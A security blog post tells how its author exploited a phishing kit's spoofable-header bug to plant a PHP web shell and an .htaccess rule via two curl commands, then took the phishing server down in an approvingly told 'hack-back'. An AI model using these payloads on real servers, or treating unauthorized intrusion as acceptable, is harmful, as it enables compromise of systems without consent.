---
layout: post
title: "Hack-back: the tale of embarrassing phishing campaign"
date: 2020-01-14 00:00:00 -0000
categories: ['Ethical hacking', 'Security research']
tags: [hack-back, phishing, PHP]
author: vavkamil
redirect_from:
  - /2020/01/14/hack-back-the-tale-of-embarrassing-phishing-campaign/
---

<hr>
<p>
    Today was a good day, I received a phishing email to by <a href="https://protonmail.com" target="_blank">Protonmail</a> address. I don't have a copy of the email, as I reported it and later deleted it as spam. Thankfully, other security research took screenshots yesterday:
</p>

---
<center>
    <blockquote class="twitter-tweet">
        <p lang="en" dir="ltr">
            Phishing these days.. These kids don&#39;t even try anymore... Full source left on their phishing landing page. LULZ sry alvinwalker247<a href="https://twitter.com/hashtag/reported?src=hash&amp;ref_src=twsrc%5Etfw">#reported</a> <a href="https://twitter.com/search?q=%24spam&amp;src=ctag&amp;ref_src=twsrc%5Etfw">$spam</a> <a href="https://twitter.com/hashtag/phishing?src=hash&amp;ref_src=twsrc%5Etfw">#phishing</a> <a href="https://twitter.com/hashtag/protonmail?src=hash&amp;ref_src=twsrc%5Etfw">#protonmail</a> <a href="https://twitter.com/hashtag/infosec?src=hash&amp;ref_src=twsrc%5Etfw">#infosec</a> <a href="https://t.co/wkoKfrtp7Y">pic.twitter.com/wkoKfrtp7Y</a>
        </p>
        &mdash; Bryan Smith (@securekomodo) <a href="https://twitter.com/securekomodo/status/1216740446178889729?ref_src=twsrc%5Etfw">January 13, 2020</a>
    </blockquote>
    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</center>
<center>
    <blockquote class="twitter-tweet">
        <p lang="en" dir="ltr">
            LOL so today someone sent me a phishing email to <a href="https://twitter.com/ProtonMail?ref_src=twsrc%5Etfw">@ProtonMail</a> address and I just accidentally took their phish server down. Source code was disclosed on hXXps://urielsilveira.com/pro/proto.zip Can you spot a vulnerability?
        </p>
        &mdash; Kamil Vavra (@vavkamil) <a href="https://twitter.com/vavkamil/status/1217173739676274689?ref_src=twsrc%5Etfw">January 14, 2020</a>
    </blockquote>
    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</center>
<br>
<hr />
<p>
    UPDATE: 17th January 2020: Another <a href="https://www.reddit.com/r/ProtonMail/comments/eor72x/just_took_down_a_phishing_server_aimed_at/felm2ud"
    target="_blank">landing page disabled</a>.
</p>
<hr />
<p>
    The phishing mail was included a Bitly link (URL shortener). The nice thing about Bitly is that you can add a plus (+) character on the end of URL and it will show you how many people clicked the link and what is the location of redirect:
</p>
<center>
    <img src="{{ '/assets/img/2020/01/image.png' | relative_url }}"
         alt=""
         title="https://bitly.com/2R1paP9+" />
</center>
<p>
    More than 100 people clicked the link when I received the phishing email. I was a little bit bored, so I started poking around a little bit. I quickly found a directory listing with full source code:
</p>
<center>
    <img src="{{ '/assets/img/2020/01/image-1.png' | relative_url }}"
         alt=""
         title="Prevent this by adding Options -Indexes to .htaccess" />
</center>
<p>
    The landing page was written in PHP, it was kinda a generic one, nothing unordinary, except a <code>blocker.php</code>file. It was a code to block security researchers and malware hunters based on IP ranges and user-agent strings. If any of the above matched, the IP was denied access in <code>.htaccess</code> and added to a file <code>badbot.txt</code> for a further investigation.
</p>
<br>
<p>The fourth line got my attention, as it was very unique:</p>
<pre><code>$ipa = $_SERVER&#91;'HTTP_CLIENT_IP']? $_SERVER&#91;'HTTP_CLIENT_IP'] : ($_SERVER&#91;'HTTP_X_FORWARDE‌​D_FOR'] ? $_SERVER&#91;'HTTP_X_FORWARDED_FOR'] : $_SERVER&#91;'REMOTE_ADDR'] );
$useragent = $_SERVER&#91;'HTTP_USER_AGENT'];

if(isset($_POST&#91;'gotcha'])){
     blockBot($ipa);
}</code></pre>
<p>
    The thing in web security is, you should never trust user input. In this case, you can spoof both <code>HTTP_CLIENT_IP</code> and <code>HTTP_X_FORWARDED_FOR</code> headers.
</p>
<br>
<p>
    If you called the <code>blocker.php</code> script with a POST request and <code>gotcha</code> parameter, the IP address was blocked:
</p>
<pre><code>function blockBot($ip){
$bot = 'deny from '.$ip;
$myfile = file_put_contents('.htaccess', PHP_EOL.$bot.PHP_EOL , FILE_APPEND | LOCK_EX);
header('HTTP/1.0 404 Not Found');
die("&lt;h1>404 Not Found&lt;/h1>The page that you have requested could not be found.");
}</code></pre>
<p>
    If the user-agent matched any array value like <code>InfoSec, Kaspersky, ...</code>, the IP was added to <code>badbot.txt</code>:
</p>
<pre><code>foreach($bad as $zbal) {
    if(stripos($useragent,$zbal) !== false) {
        file_put_contents('badbot.txt', $ipa, FILE_APPEND | LOCK_EX);
        blockBot($ipa);
    }
}</code></pre>
<p>
    So I quickly figured out that I can insert PHP shell to <code>badbot.txt</code> and force .htaccess to execute .txt files as PHP. The trick from the 2000s used to hack insecure PHP uploads :)
</p>
<br>
<p>
    Inserting PHP web shell into <code>badbot.txt</code> (learned this one from <a href="https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html"
    target="_blank">Sucuri</a>):
</p>
<pre><code>curl $url/blocker.php -H "CLIENT-IP: &lt;?php extract($_REQUEST);$a($b); ?> " -H "User-agent: InfoSec"</code></pre>
<p>Forcing Apache to execute .txt as PHP via .htaccess:</p>
<pre><code>curl $url/blocker.php -H "CLIENT-IP: \r\nAddType application/x-httpd-php .txt\r\n" -H "User-agent: google" --data "gotcha=1"</code></pre>
<p>
    This can be a very nice CTF challenge, full source-code here:
    <br>
    <a href="https://gist.github.com/vavkamil/b115ef829329f9fd3876c077e843641b"
       target="_blank">https://gist.github.com/vavkamil/b115ef829329f9fd3876c077e843641b</a>
</p>
<script src="https://gist.github.com/vavkamil/b115ef829329f9fd3876c077e843641b.js"></script>
<p>
    In the end, I was able to take down the phishing infrastructure in less than 30 minutes, and maybe saved someone from a compromise. Mess with the best, die like the rest!
</p>
<p>
    <strong>Indicators of compromise (IoC):</strong>
</p>
<ul>
    <li>urielsilveira[dot]com</li>
    <li>keyword.tech.2017[at]gmail.com</li>
    <li>alvinwalker247[at]gmail.com</li>
</ul>
<h2>PoC</h2>
<center>
    <img src="{{ '/assets/img/2020/01/error_500.png' | relative_url }}"
         alt=""
         title="Phishing out of service" />
</center>
